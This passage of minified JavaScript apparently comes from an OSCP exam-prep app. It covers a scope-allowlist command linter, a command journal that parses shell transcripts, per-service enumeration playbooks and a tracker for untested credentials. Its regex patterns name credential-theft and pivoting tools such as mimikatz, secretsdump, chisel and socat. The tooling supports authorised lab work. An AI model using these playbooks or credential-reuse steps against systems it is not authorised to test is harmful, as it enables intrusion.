function saveGuard(){guardConfig={entries:$('#scopeEntries').value.split(/\r?\n/).map(x=>x.trim()).filter(Boolean),requireScope:$('#guardRequireScope').checked,checkPlaceholders:$('#guardPlaceholder').checked,lhost:$('#guardLhost').value.trim(),msfTargetId:$('#guardMsfTarget').value};safeStoreSet(STORE+'guardConfig',JSON.stringify(guardConfig));v9Dirty=true;renderGuard();renderBuiltCommands();toast('Guard saved')}$('#saveGuardConfig').onclick=saveGuard;$('#scopeFromTargets').onclick=()=>{const set=new Set([...normalizedScope(),...targets.map(t=>t.ip).filter(Boolean)]);$('#scopeEntries').value=[...set].join('\n');saveGuard()};$('#lintGuardCommand').onclick=()=>{$('#guardResults').innerHTML=guardIssuesHTML(lintCommand($('#guardCommand').value))};$('#openGuard').onclick=()=>{switchView('guardView');renderGuard()};function renderCockpitGuard(){const r=$('#cockpitGuard');if(!r)return;const e=normalizedScope();r.innerHTML=e.length?`<span class="guardStatus ok">${e.length} scope entr${e.length===1?'y':'ies'} configured</span><br><span class="tiny">Rule snapshot verified ${RULE_VERIFIED_DATE}; official guide overrides this copy.</span>`:'<span class="guardStatus warn">Scope allowlist not configured.</span><br><span class="tiny">Rule-sensitive linting still works, destination checks are limited.</span>'}
const v10BuiltBase=renderBuiltCommands;renderBuiltCommands=function(){v10BuiltBase();const r=$('#cmdGuardInline');if(r)r.innerHTML=guardIssuesHTML(lintCommand($('#builtCommands').textContent||''))};

function inferJournalCategory(cmd){const l=cmd.toLowerCase();if(/\bnmap\b|ferox|ffuf|gobuster|whatweb|nikto|ldapsearch/.test(l))return'enum';if(/\bssh\b|evil-winrm|psexec|wmiexec|atexec|smbexec|mssqlclient/.test(l))return'access';if(/sudo\s+-l|find .*perm|winpeas|linpeas|whoami\s+\/priv|getcap|systemctl|schtasks/.test(l))return'privesc-enum';if(/ligolo|chisel|proxychains|ssh\s+-[ldr]|socat/.test(l))return'pivot';if(/local\.txt|proof\.txt|ipconfig|ip addr|ifconfig/.test(l))return'evidence';if(/hashcat|john|secretsdump|mimikatz/.test(l))return'credential';return'other'}
function cleanPromptCommand(line,mode='auto'){let s=line.replace(/\x1b\[[0-9;?]*[ -/]*[@-~]/g,'').trimEnd(),m;m=s.match(/^(?:PS\s+[^>]+>|[A-Za-z]:\\[^>]*>)\s*(.+)$/);if(m)return m[1].trim();m=s.match(/^(?:└─[$#]|[$#])\s*(.+)$/);if(m)return m[1].trim();m=s.match(/^[\w.@-]+(?::[^\n$#]+)?[$#]\s+(.+)$/);if(m)return m[1].trim();m=s.match(/^\s*\d+\s+(.+)$/);if((mode==='history'||mode==='auto')&&m)return m[1].trim();m=s.match(/^\s*\d{9,}:\d+;(.+)$/);if((mode==='history'||mode==='auto')&&m)return m[1].trim();return null}
function parseJournalText(text,mode='auto'){text=String(text??'');if(text.length>MAX_TEXT_INTAKE_CHARS)throw new Error('Journal input exceeds the 10 MB text safety limit');const out=[],seen=new Set();for(const line of text.split(/\r?\n/)){const cmd=cleanPromptCommand(line,mode);if(!cmd||cmd.length<2||seen.has(cmd))continue;if(/^(?:Nmap scan report|Starting Nmap|PORT\s+STATE|uid=\d+|Windows IP Configuration)/i.test(cmd))continue;seen.add(cmd);const g=lintCommand(cmd);out.push({id:Date.now()+'-'+Math.random(),command:cmd,category:inferJournalCategory(cmd),selected:true,guard:g.issues.map(x=>x.sev),source:'transcript'})}return out.slice(0,1000)}
function renderJournalSelectors(){const s=$('#journalTarget');if(!s)return;s.innerHTML=targets.map(t=>`<option value="${esc(t.id)}">${esc(targetLabel(t))}</option>`).join('')||'<option value="">No targets</option>';s.value=activeTargetId||targets[0]?.id||''}
function renderJournalPreview(){const root=$('#journalPreview');if(!root)return;const b=journalPreview.filter(x=>x.guard.includes('block')).length,w=journalPreview.filter(x=>x.guard.includes('warn')).length;$('#journalPreviewStats').innerHTML=`<div class="journalStat"><b>${journalPreview.length}</b><br><span class="tiny">commands</span></div><div class="journalStat"><b>${b}</b><br><span class="tiny">guard block</span></div><div class="journalStat"><b>${w}</b><br><span class="tiny">guard warning</span></div>`;$('#applyJournalPreview').disabled=!journalPreview.some(x=>x.selected);root.innerHTML=journalPreview.length?journalPreview.map((j,i)=>`<div class="journalRow"><input class="journalSelect" data-ji="${i}" type="checkbox" ${j.selected?'checked':''}><span class="chip">${esc(j.category)}</span><div class="journalCmd">${esc(j.command)}</div><span class="guardStatus ${j.guard.includes('block')?'bad':j.guard.includes('warn')?'warn':'ok'}">${j.guard.includes('block')?'BLOCK':j.guard.includes('warn')?'WARN':'OK'}</span></div>`).join(''):'Nothing parsed.';$$('.journalSelect').forEach(x=>x.onchange=()=>{journalPreview[+x.dataset.ji].selected=x.checked;renderJournalPreview()})}
function renderJournal(){const t=activeTarget(),body=$('#journalBody');if(!body||!t)return;$('#journalTarget').value=t.id;const q=($('#journalFilter').value||'').toLowerCase(),items=(t.journal||[]).filter(j=>!q||j.command.toLowerCase().includes(q)||j.category.toLowerCase().includes(q)||String(j.note||'').toLowerCase().includes(q));body.innerHTML=items.length?items.map(j=>{const g=lintCommand(j.command),sev=g.issues.some(x=>x.sev==='block')?'BLOCK':g.issues.some(x=>x.sev==='warn')?'WARN':'OK';return`<tr><td>${new Date(j.at).toLocaleString()}</td><td><select class="journalCatEdit" data-jid="${esc(j.id)}">${['enum','access','credential','privesc-enum','pivot','evidence','other'].map(c=>`<option ${c===j.category?'selected':''}>${c}</option>`).join('')}</select></td><td class="journalCmd">${esc(j.command)}</td><td><span class="guardStatus ${sev==='BLOCK'?'bad':sev==='WARN'?'warn':'ok'}">${sev}</span></td><td><input class="journalReport" data-jid="${esc(j.id)}" type="checkbox" ${j.includeReport!==false?'checked':''}></td><td><input class="journalNoteEdit" data-jid="${esc(j.id)}" value="${esc(j.note||'')}" placeholder="note"></td><td><button class="btn bad journalDel" data-jid="${esc(j.id)}">×</button></td></tr>`}).join(''):'<tr><td colspan="7" class="muted">No commands in this target journal.</td></tr>';$$('.journalCatEdit').forEach(x=>x.onchange=()=>{const j=t.journal.find(y=>y.id===x.dataset.jid);j.category=x.value;saveTargets();renderJournal()});$$('.journalReport').forEach(x=>x.onchange=()=>{const j=t.journal.find(y=>y.id===x.dataset.jid);j.includeReport=x.checked;saveTargets();renderReportJournalSummary()});$$('.journalNoteEdit').forEach(x=>x.onchange=()=>{const j=t.journal.find(y=>y.id===x.dataset.jid);j.note=x.value;saveTargets()});$$('.journalDel').forEach(x=>x.onclick=()=>{t.journal=t.journal.filter(y=>y.id!==x.dataset.jid);saveTargets();renderJournal();renderReportJournalSummary()})}
async function readJournalFiles(files){for(const f of files){try{assertImportFileSize(f,'Journal input');journalPreview.push(...parseJournalText(await f.text(),$('#journalParser').value));if(journalPreview.length>3000){journalPreview=journalPreview.slice(0,3000);toast('Journal preview capped at 3000 commands for browser stability')}}catch(e){toast(`Could not parse ${f.name}`)}}renderJournalPreview()}$('#journalFiles').onchange=e=>readJournalFiles([...e.target.files]);$('#parseJournalPaste').onclick=()=>{journalPreview=parseJournalText($('#journalPaste').value,$('#journalParser').value);renderJournalPreview()};$('#clearJournalPreview').onclick=()=>{journalPreview=[];$('#journalPaste').value='';renderJournalPreview()};$('#applyJournalPreview').onclick=()=>{const t=targets.find(x=>x.id===$('#journalTarget').value)||activeTarget();if(!t)return;const existing=new Set((t.journal||[]).map(x=>x.command));let n=0;journalPreview.filter(x=>x.selected).forEach(x=>{if(existing.has(x.command))return;t.journal.push({id:crypto.randomUUID?crypto.randomUUID():x.id,at:Date.now(),command:x.command,category:x.category,note:'',includeReport:true,source:x.source});existing.add(x.command);n++});if(n){logEvent(t,'journal',`Imported ${n} unique command(s) into command journal`);saveTargets()}renderJournal();renderReportJournalSummary();toast(`${n} command(s) added`)};$('#journalTarget').onchange=e=>{setActiveTarget(e.target.value);renderJournal()};$('#journalFilter').oninput=renderJournal;$('#copyJournalCommands').onclick=async()=>{const t=activeTarget();await guardedCopyText((t?.journal||[]).map(x=>x.command).join('\n'),'Journal commands')};
function journalMarkdown(t){const items=(t?.journal||[]).filter(x=>x.includeReport!==false);return items.length?`## Command Journal\n\n${items.map((j,i)=>`${i+1}. **${j.category}**\n\n\`\`\`bash\n${j.command}\n\`\`\`${j.note?`\n\nNote: ${j.note}`:''}`).join('\n\n')}\n`:''}$('#exportJournal').onclick=()=>{const t=activeTarget();if(t)downloadText(`OSCP-${safeName(t)}-command-journal.md`,journalMarkdown(t),'text/markdown')};function renderReportJournalSummary(){const root=$('#reportJournalSummary'),t=activeTarget();if(!root||!t)return;const items=(t.journal||[]).filter(x=>x.includeReport!==false);root.innerHTML=items.length?`<b>${items.length}</b> command(s) will be appended to the generated report.<div class="tiny">Manage inclusion under Command Journal.</div>`:'No journal commands selected for the report.'}
const v10ReportMarkdownBase=reportMarkdown;reportMarkdown=function(t){return v10ReportMarkdownBase(t)+(t?.journal?.some(x=>x.includeReport!==false)?'\n\n'+journalMarkdown(t):'')};const v10RenderReportBase=renderReport;renderReport=function(){v10RenderReportBase();renderReportJournalSummary()};
const v10SessionPayloadBase=sessionPayload;sessionPayload=function(includeSecrets=false){const o=v10SessionPayloadBase(includeSecrets);o.app='OSCP-V10';o.version=10;o.guardConfig=guardConfig;return o};const v10RestoreBase=restoreV9Payload;restoreV9Payload=function(o){if(o?.guardConfig)guardConfig=normalizeGuardConfig(o.guardConfig);v10RestoreBase(o);guardConfig=normalizeGuardConfig(guardConfig);safeStoreSet(STORE+'guardConfig',JSON.stringify(guardConfig));renderGuard();renderAllV10()};
function journalCount(){return targets.reduce((n,t)=>n+(t.journal?.length||0),0)}const v10HealthBase=renderSessionHealth;renderSessionHealth=function(){v10HealthBase();const root=$('#sessionHealth');if(root)root.innerHTML+=`<div class="healthBox"><div class="healthNum">${journalCount()}</div><div class="tiny">journal commands</div></div><div class="healthBox"><div class="healthNum">${normalizedScope().length}</div><div class="tiny">scope entries</div></div>`};
function renderAllV10(){renderAllV9();renderGuard();renderJournalSelectors();renderJournalPreview();renderJournal();renderReportJournalSummary();renderCockpitGuard()}const v10Switch=switchView;switchView=function(id){v10Switch(id);if(id==='guardView')renderGuard();if(id==='journalView'){renderJournalSelectors();renderJournal();renderJournalPreview()}};renderAllV10();

renderAllV9();

/* ===== V11 Expert Operator / Coverage / Credential Debt ===== */
let expertPrefs=safeStoredRecord(STORE+'expertPrefs',{rotation:30,break:120});expertPrefs={...expertPrefs,rotation:Number.isFinite(+expertPrefs.rotation)?Math.min(240,Math.max(5,Math.round(+expertPrefs.rotation))):30,break:Number.isFinite(+expertPrefs.break)?Math.min(360,Math.max(15,Math.round(+expertPrefs.break))):120};
const SERVICE_PLAYBOOKS={
 FTP:{ports:[21],tag:'[PORT:21]',checks:[['banner','Capture banner/version',/ftp|21\/tcp/i],['anon','Try anonymous/login path',/ftp.*anonymous|anonymous.*ftp|ftp\s+.*@/i],['list','List recursively / inspect files',/ftp.*ls|ftp.*dir|wget.*ftp:|curl.*ftp:/i],['write','Check writable upload only if appropriate',/ftp.*put\s|ftp.*upload/i]]},
 SSH:{ports:[22],tag:'[PORT:22]',checks:[['banner','Capture exact SSH/version',/nmap.*22|ssh-keyscan|ssh\s+-v/i],['cred','Test discovered credentials/keys',/^ssh\s|sshpass| -i\s+.*ssh|ssh\s+.*@/i],['keys','Inspect keys/config after shell',/\.ssh|authorized_keys|id_rsa|id_ed25519/i]]},
 SMTP:{ports:[25,465,587],tag:'[PORT:25]',checks:[['banner','Capture banner/capabilities',/smtp|ehlo|helo/i],['users','Check user enumeration if exposed',/vrfy|expn/i],['relay','Validate relay only if relevant/safe',/rcpt to:|mail from:/i]]},
 POP3:{ports:[110,995],tag:'[PORT:110]',checks:[['banner','Capture POP3 banner/capabilities',/pop3|\bCAPA\b|openssl\s+s_client[^\n]*995/i],['auth','Validate only a justified/recovered credential',/\bUSER\s+[^\n]+\bPASS\b|curl[^\n]*pop3/i],['mail','After auth, inspect only messages useful to the objective',/\bLIST\b|\bRETR\s+\d+/i]]},
 IMAP:{ports:[143,993],tag:'[PORT:143]',checks:[['banner','Capture IMAP banner/capabilities',/imap|CAPABILITY|openssl\s+s_client[^\n]*993/i],['auth','Validate only a justified/recovered credential',/\bLOGIN\b|curl[^\n]*imap/i],['mail','After auth, inspect useful mailboxes/messages',/\bSELECT\b|\bFETCH\b|\bLIST\b[^\n]*mail/i]]},
 DNS:{ports:[53],tag:'[PORT:53]',checks:[['records','Query records/SRV',/\bdig\b|nslookup|host\s+/i],['axfr','Attempt AXFR against known zone',/axfr/i],['hosts','Feed discovered hostnames into vhost/hosts mapping',/\/etc\/hosts|resolve|vhost|ffuf.*host:/i]]},
 WEB:{ports:[80,443,8000,8080,8443,8888],tag:'[WEB:ENUM]',checks:[['host','Confirm hostname/vhost/TLS names',/whatweb|curl.*-i|openssl s_client|ffuf.*host:/i],['source','Inspect source/robots/sitemap',/robots\.txt|sitemap|view-source|curl.*robots/i],['content','Content discovery',/ferox|gobuster|ffuf.*-u|dirsearch/i],['auth','Inspect authentication/default creds/session',/login|signin|burp|cookie/i],['params','Parameters/API/manual functionality',/burp|curl.*[?&]|api|postman/i],['backup','Backups/config/source exposure',/\.bak|\.old|backup|\.git|\.env|config/i]]},
 SMB:{ports:[139,445],tag:'[PORT:445]',checks:[['guest','Null/guest/basic access',/smbclient.*-n|smbclient.*-l|nxc smb.*-u ['\"]{0,1}['\"]|guest/i],['shares','Enumerate shares',/--shares|smbclient\s+-l|smbmap/i],['users','Users/RPC if relevant',/rpcclient|--users|enum4linux/i],['files','Inspect accessible files',/smbclient.*-c|recurse|prompt off|get\s+/i],['creds','Test discovered credentials',/nxc smb.*-u|smbclient.*-u/i]]},
 LDAP:{ports:[389,636,3268,3269],tag:'[AD:LDAP]',checks:[['base','Discover naming context/domain',/ldapsearch.*namingcontexts|rootdse/i],['objects','Enumerate users/groups/computers',/ldapsearch.*objectclass|bloodhound-ce-python|sharphound/i]]},
 KERBEROS:{ports:[88],tag:'[AD:KERBEROS]',checks:[['time','Confirm DNS/DC/time before Kerberos debugging',/\bdate\b|ntpdate|timedatectl|rdate/i],['users','Build/validate domain users',/kerbrute|GetNPUsers|ldapsearch.*samaccountname/i],['asrep','Check AS-REP candidates',/GetNPUsers/i],['spn','Check SPNs after creds',/GetUserSPNs/i]]},
 RPCBIND:{ports:[111],tag:'[PORT:111]',checks:[['rpc','Enumerate registered RPC programs',/rpcinfo\s+-p|nmap[^\n]*rpcinfo/i],['map','Map discovered RPC programs to the real service/port',/rpcinfo|program version protocol port/i]]},
 MSRPC:{ports:[135],tag:'[PORT:135]',checks:[['epm','Enumerate the RPC endpoint mapper',/impacket-rpcdump|rpcdump\.py|nmap[^\n]*msrpc-enum/i],['map','Map interesting UUIDs/endpoints to a concrete service or next hypothesis',/rpcdump|msrpc-enum|endpoint mapper|\buuid\b/i]]},
 NFS:{ports:[2049],tag:'[LINUX:NFS]',checks:[['rpc','Confirm NFS/mountd in RPC map when rpcbind is exposed',/rpcinfo.*(?:nfs|mountd)|(?:nfs|mountd).*rpcinfo/i],['exports','List exports',/showmount/i],['mount','Mount and inspect permissions',/mount.*nfs|mount -t nfs/i]]},
 SNMP:{ports:[161],tag:'[PORT:161]',checks:[['community','Test known/default community manually',/snmpwalk|snmpget/i],['intel','Enumerate users/processes/software/routes',/snmpwalk/i]]},
 MSSQL:{ports:[1433],tag:'[PORT:1433]',checks:[['auth','Validate credentials',/nxc mssql|mssqlclient/i],['context','Enumerate DB/login/impersonation context',/mssqlclient|select.*system_user|execute as|impersonat/i],['links','Check linked-server/context only if found',/sp_linkedservers|openquery|linked server/i]]},
 ORACLE:{ports:[1521],tag:'[PORT:1521]',checks:[['listener','Capture listener/version/status',/oracle-tns-version|tnscmd10g.*(?:version|status)|1521\/tcp/i],['service','Identify SID/service name from evidence or one focused discovery path',/odat(?:\.py)?\s+sidguesser|oracle-sid-brute|service_name|sid=/i],['auth','Validate one justified credential without inline password exposure',/sqlplus\s+-L|sqlplus\s+[^\n]*@/i],['context','After auth, record DB user/roles/version before choosing a module',/session_roles|v\$version|select\s+user|current_user/i]]},
 MYSQL:{ports:[3306],tag:'[PORT:3306]',checks:[['auth','Validate credentials',/mysql\s+-h|nxc.*mysql/i],['data','Enumerate databases/config secrets',/show databases|information_schema|mysql.*-e/i]]},
 RDP:{ports:[3389],tag:'[PORT:3389]',checks:[['auth','Validate discovered credentials',/nxc rdp|xfreerdp|rdesktop/i]]},
 WINRM:{ports:[5985,5986],tag:'[PORT:5985]',checks:[['auth','Validate credentials',/nxc winrm|evil-winrm/i],['shell','If authorized, obtain stable shell and re-enumerate',/evil-winrm/i]]},
 REDIS:{ports:[6379],tag:'[PORT:6379]',checks:[['auth','Check auth/config/data exposure',/redis-cli/i]]},
 DOCKER:{ports:[2375,2376],tag:'[PORT:2375]',checks:[['version','Confirm Docker API/version and TLS/auth requirement',/docker[^\n]*version|curl[^\n]*(?:2375|2376)[^\n]*\/version/i],['inventory','Enumerate containers/images only if API access is confirmed',/docker[^\n]*\bps\b|containers\/json|docker[^\n]*images/i],['control','Before any host-impacting action, confirm daemon context and exact control primitive',/docker[^\n]*\binfo\b|docker[^\n]*inspect/i]]},
 ELASTICSEARCH:{ports:[9200],tag:'[PORT:9200]',checks:[['version','Capture Elasticsearch version/cluster identity',/curl[^\n]*9200[^\n]*\/?(?:\s|$)|elasticsearch/i],['indices','List indices/aliases before querying data',/_cat\/indices|_aliases/i],['data','Query only a specific useful index/document',/_search|_doc\//i]]},
 MONGODB:{ports:[27017],tag:'[PORT:27017]',checks:[['auth','Check auth and enumerate databases/collections',/mongosh|mongo\s+--host/i]]},
 POSTGRES:{ports:[5432],tag:'[PORT:5432]',checks:[['banner','Confirm PostgreSQL/version/TLS',/nmap.*5432|postgres|pgsql/i],['auth','Validate discovered/default credentials only when justified',/psql\s|PGPASSWORD/i],['data','Enumerate databases/roles/config after auth',/\\l|pg_database|pg_roles|show all/i]]},
 VNC:{ports:[5900],tag:'[PORT:5900]',checks:[['banner','Confirm VNC/security type',/vnc-info|vncviewer|5900\/tcp/i],['auth','Validate only justified/default/recovered credentials',/vncviewer|hydra.*vnc|medusa.*vnc/i]]},
 TELNET:{ports:[23],tag:'[PORT:23]',checks:[['banner','Capture Telnet banner/login behavior',/telnet|23\/tcp/i],['auth','Try only justified/recovered credentials',/^telnet\s|hydra.*telnet/i]]},
 RSYNC:{ports:[873],tag:'[PORT:873]',checks:[['modules','List exposed rsync modules',/rsync.*::|873\/tcp/i],['files','Inspect only useful module content',/rsync.*::/i]]}
};
function genericServicePlaybook(p){
 const port=+p?.port||0,proto=String(p?.proto||'tcp').replace(/[^a-z]/gi,'')||'tcp',portEsc=String(port).replace(/[.*+?^${}()|[\]\\]/g,'\\$&');
 const fingerprint=new RegExp(String.raw`(?:nmap[^\n]*(?:-p(?:ort)?\s*${portEsc}\b)|\b${portEsc}/${proto}\b)`,'i');
 const manual=new RegExp(String.raw`(?:nc|ncat|telnet|curl|openssl\s+s_client|socat)[^\n]*(?:[:\s])${portEsc}\b`,'i');
 return{tag:'[SERVICE:UNKNOWN]',checks:[
  ['fingerprint','Capture exact port/service/version',fingerprint],
  ['manual','Interact with this exact protocol/application manually',manual],
  ['hypothesis','Map one evidence-backed next test; exact-version exploit only after prerequisites',/(?!)/]
 ]}
}

function upgradeV11Target(t){t=upgradeV10Target(t);t.coverage=plainRecord(t.coverage)?t.coverage:{};for(const k of Object.keys(t.coverage)){if(!plainRecord(t.coverage[k]))delete t.coverage[k]}t.firstTouched=Number.isFinite(+t.firstTouched)?+t.firstTouched:(+t.updated||Date.now());return t}
targets=targets.map(upgradeV11Target);
const v11NewTargetBase=newTarget;newTarget=function(){return upgradeV11Target(v11NewTargetBase())};

/* Prefer the newest V10 state over older fallback migrations. */
try{
 const latest=JSON.parse(localStorage.getItem('oscp_v10_targets')||'[]');
 if(Array.isArray(latest)&&latest.length){
   targets=latest.map(upgradeV11Target);
   const cr=JSON.parse(localStorage.getItem('oscp_v10_credentials')||'[]'),fv=JSON.parse(localStorage.getItem('oscp_v10_favorites')||'[]'),pf=JSON.parse(localStorage.getItem('oscp_v10_preflight')||'null'),bc=JSON.parse(localStorage.getItem('oscp_v10_boardConfig')||'null'),ev=JSON.parse(localStorage.getItem('oscp_v10_evidenceVault')||'[]'),gc=JSON.parse(localStorage.getItem('oscp_v10_guardConfig')||'null');
   if(Array.isArray(cr))credentials=cr;if(Array.isArray(fv))favorites=fv;if(pf)preflightData=pf;if(bc)boardConfig=bc;if(Array.isArray(ev))evidenceVault=ev;if(gc)guardConfig=gc;
   if(preflightData!==null&&(!preflightData||typeof preflightData!=='object'||Array.isArray(preflightData)))preflightData=null;
   if(!boardConfig||typeof boardConfig!=='object'||Array.isArray(boardConfig))boardConfig={passTarget:70};
   if(!guardConfig||typeof guardConfig!=='object'||Array.isArray(guardConfig))guardConfig={entries:[],requireScope:true,checkPlaceholders:true,lhost:'',msfTargetId:''};
   const a=localStorage.getItem('oscp_v10_activeTarget');activeTargetId=a&&targets.some(t=>t.id===a)?a:targets[0].id;
   targets.forEach(t=>{if(t.creds)sessionSecrets[t.id]=t.creds;if(!persistSecrets)t.creds=''});credentials.forEach(c=>{if(c.secret)sessionCredentialSecrets[c.id]=c.secret;if(!persistSecrets)c.secret=''});
   v9SaveTargetsBase();v9SaveOpsBase();safeStoreSet(STORE+'boardConfig',JSON.stringify(boardConfig));safeStoreSet(STORE+'evidenceVault',JSON.stringify(evidenceVault));safeStoreSet(STORE+'guardConfig',JSON.stringify(guardConfig));
 }
}catch(e){}

function journalText(t){return (t?.journal||[]).map(j=>j.command).join('\n')}
function serviceInstances(t){
 const ports=(t?.ports||[]).filter(p=>p.state!=='closed'),groups=new Map(),unknown=[];
 for(const p of ports){const name=canonicalServiceName(p);if(name&&SERVICE_PLAYBOOKS[name]){if(!groups.has(name))groups.set(name,[]);groups.get(name).push(p)}else unknown.push(p)}
 const out=[...groups.entries()].map(([name,ps])=>[name,SERVICE_PLAYBOOKS[name],ps]);
 for(const p of unknown){const label=`UNKNOWN ${p.port}/${p.proto||'tcp'}${p.service?' · '+p.service:''}`;out.push([label,genericServicePlaybook(p),[p]])}
 return out;
}
function checkCoverage(t,name,pb){
 const jt=journalText(t),manual=t.coverage?.[name]||{},rows=pb.checks.map(([id,label,re])=>{const auto=re.test(jt),done=auto||manual[id]===true;return{id,label,auto,done}});return rows;
}
function coverageStats(t){let done=0,total=0;for(const [n,pb] of serviceInstances(t)){for(const r of checkCoverage(t,n,pb)){total++;if(r.done)done++}}return{done,total,pct:total?Math.round(done/total*100):0}}
function uncoveredServices(t){const out=[];for(const [n,pb,ports] of serviceInstances(t)){const rows=checkCoverage(t,n,pb),missing=rows.filter(x=>!x.done);if(missing.length)out.push({name:n,pb,ports,missing})}return out}

function closureItems(t){
 const items=[];const add=(k,l,ok)=>items.push({k,l,ok:!!ok});
 if(t.status.foothold||t.status.local||t.status.privesc||t.status.proof){add('localRead','local.txt read from original location',t.evidence?.localRead);add('localSubmitted','local flag submitted',t.evidence?.localSubmitted);add('localScreenshot','local screenshot shows proof + IP',t.evidence?.localScreenshot);add('footholdRecorded','foothold + exact commands recorded',t.evidence?.footholdRecorded&&t.evidence?.commandsRecorded)}
 if(t.status.privesc||t.status.proof){add('proofRead','proof.txt read from original location',t.evidence?.proofRead);add('proofSubmitted','proof flag submitted',t.evidence?.proofSubmitted);add('proofScreenshot','proof screenshot shows proof + IP',t.evidence?.proofScreenshot);add('privescRecorded','privesc path reproducible',t.evidence?.privescRecorded&&t.evidence?.reproducible)}
 return items;
}
function credentialDebts(){
 const debts=[];for(const c of credentials){const scope=String(c.scope||'domain').toLowerCase();for(const t of targets){const svc=[...new Set((t.ports||[]).filter(p=>p.state!=='closed').map(canonicalServiceName).filter(s=>['SMB','WINRM','RDP','SSH','MSSQL','LDAP','KERBEROS','WEB'].includes(s)))];
   const relevant=svc.filter(s=>scope==='application'?s==='WEB':scope==='local'?!['LDAP','KERBEROS'].includes(s):true);
   for(const s of relevant){const st=c.checks?.[t.id+'|'+s]||'untested';if(st!=='untested')continue;let p=3,why='Credential has not been tested against a relevant exposed service.';
    if(scope==='application'){if(c.sourceTarget&&c.sourceTarget!==t.id)continue;p=2;why='Application-scoped credential: test only against the originating/relevant web application unless reuse is separately evidenced.'}
    else if(scope==='local'){const sameHost=!c.sourceTarget||c.sourceTarget===t.id;if(!sameHost){p=4;why='Local credential on another host is only a reuse hypothesis; do not treat it as domain-wide identity.'}else{if(s==='SMB'||s==='WINRM'||s==='SSH')p=1;else if(s==='MSSQL'||s==='RDP')p=2;why='Local credential: validate with local-auth semantics; do not send it to LDAP/Kerberos.'}}
    else{if(s==='WINRM'||s==='SSH'||s==='SMB'||s==='LDAP'||s==='KERBEROS')p=1;else if(s==='MSSQL'||s==='RDP')p=2;why='Domain credential: validate against relevant domain/member services using the correct domain identity.'}
    debts.push({p,c,t,s,why})
   }
  }}
 return debts.sort((a,b)=>a.p-b.p);
}
function attentionQueue(t){
 const q=[],add=(p,title,why,tag,kind='action')=>q.push({p,title,why,tag,kind});
 if(!t)return[];
 const closure=closureItems(t).filter(x=>!x.ok);if((t.status.foothold||t.status.privesc)&&closure.length)add(0,'BANK THE POINTS BEFORE ANYTHING ELSE',closure.slice(0,4).map(x=>x.l).join(' · '),'[EVIDENCE:PACKET]','evidence');
 const debts=credentialDebts().filter(d=>d.t.id===t.id).slice(0,4);for(const d of debts)add(d.p,`Test ${d.c.user} on ${d.s}`,`Untested credential × exposed service on ${targetLabel(t)}.`,'[CREDS:FANOUT]','credential');
 for(const f of (t.findings||[]).filter(f=>['high','prereq'].includes(f.confidence)).slice(0,5))add(f.confidence==='high'?1:2,`Validate: ${f.title}`,`Current confidence: ${confLabel(f.confidence)}. Prove the prerequisite/trigger or kill the hypothesis.`,f.tag||'[EXPLOIT:GATE]','finding');
 for(const u of uncoveredServices(t).slice(0,5))add(2,`${u.name}: ${u.missing[0].label}`,`${u.missing.length} minimum-enumeration check(s) still uncovered for ${u.ports.map(p=>p.port+'/'+p.proto).join(', ')}.`,u.pb.tag,'coverage');
 const recs=recommendActions(t);for(const r of recs.slice(0,3))add(Math.min(4,r.p+1),r.title,r.why,r.tag,'methodology');
 const seen=new Set();return q.sort((a,b)=>a.p-b.p).filter(x=>{const k=x.title+'|'+x.tag;if(seen.has(k))return false;seen.add(k);return true}).slice(0,12)
}
function phaseFor(t){if(!t)return'enumeration';if(t.stage==='complete')return'closure';if(t.status.privesc||t.status.proof)return'evidence';if(t.status.foothold||hasSignal(t,'linux-shell')||hasSignal(t,'windows-shell'))return'privesc';if((t.findings||[]).some(f=>['high','prereq'].includes(f.confidence))||hasSignal(t,'creds'))return'validation';return'enumeration'}
function renderOperator(){
 const t=activeTarget();renderOperatorSelectors();if(!t)return;
 const phases=[['enumeration','ENUM','Map surfaces, minimum service coverage'],['validation','VALIDATE','Prove strongest clue; kill weak hypotheses'],['foothold','FOOTHOLD','Stable shell + local evidence + re-enum'],['privesc','PRIVESC','Privilege + control + trigger'],['evidence','BANK','Proof, submit, journal, break']];const cur=phaseFor(t);
 $('#operatorPhases').innerHTML=phases.map(([k,a,b])=>`<div class="phase ${k===cur?'active':''}"><b>${a}</b>${b}</div>`).join('');
 const q=attentionQueue(t);$('#attentionCount').textContent=q.length+' item'+(q.length===1?'':'s');$('#attentionQueue').innerHTML=q.length?q.map(x=>`<div class="attention p${x.p}"><div class="row" style="justify-content:space-between"><div><div class="attentionTitle">${esc(x.title)}</div><div class="attentionWhy">${esc(x.why)}</div><div class="attentionMeta">${esc(x.kind)} · priority ${x.p}</div></div><button class="btn attTag" data-tag="${esc(x.tag)}">${esc(x.tag)}</button></div></div>`).join(''):'<div class="muted">No queued action. Use Stuck Reset and inspect assumptions.</div>';
 $$('.attTag').forEach(b=>b.onclick=()=>{$('#globalSearch').value=b.dataset.tag;switchView('searchView');renderSearch(b.dataset.tag)});
 $('#operatorResume').innerHTML=resumeHTML(t);const hs=[];(t.findings||[]).filter(f=>['high','prereq','exploited'].includes(f.confidence)).forEach(f=>hs.push(`<span class="hs ${f.confidence==='high'?'green':f.confidence==='exploited'?'green':'yellow'}">${esc(f.title)}</span>`));if(hasSignal(t,'creds'))hs.push('<span class="hs green">credential available</span>');if(hasSignal(t,'internal'))hs.push('<span class="hs yellow">new internal surface</span>');$('#operatorSignals').innerHTML=hs.join('')||'<span class="muted">No high-signal facts marked yet.</span>';
 const ci=closureItems(t);$('#operatorClosure').innerHTML=ci.length?ci.map(x=>`<div class="closureItem ${x.ok?'ok':'miss'}">${x.ok?'✅':'❌'} ${esc(x.l)}</div>`).join(''):'<div class="muted">Closure checklist activates after foothold.</div>';$('#closureAdvice').textContent=ci.some(x=>!x.ok)?'Do not mentally count the machine as banked yet.':'Evidence/closure checks currently satisfied.';
 $('#expertRotation').value=expertPrefs.rotation||30;$('#expertBreak').value=expertPrefs.break||120;const age=Math.floor((Date.now()-(t.lastActivity||Date.now()))/60000);$('#operatorClockNote').textContent=age>=expertPrefs.rotation?`No recorded change for ~${age}m: justify one exact next validation or rotate.`:`Last recorded change ~${age}m ago.`;
 $('#operatorRules').innerHTML=[
  'Read tool output before launching the next tool.',
  'A version is not a vulnerability; a prerequisite is not an exploit.',
  'New credential → validate only on relevant exposed services.',
  'New shell → identity + network + internal listeners + privilege + flag.',
  'New host/identity → re-enumerate local + AD attack surface.',
  'Privilege escalation requires: privileged actor + controllable input + trigger.',
  'If 2+ exploit prerequisites are unknown, enumerate instead of “trying PoCs”.',
  'Once points are banked, protect them before chasing extra points.'
 ].map(x=>`<div class="operatorRule"><strong>→</strong> ${x}</div>`).join('');
}
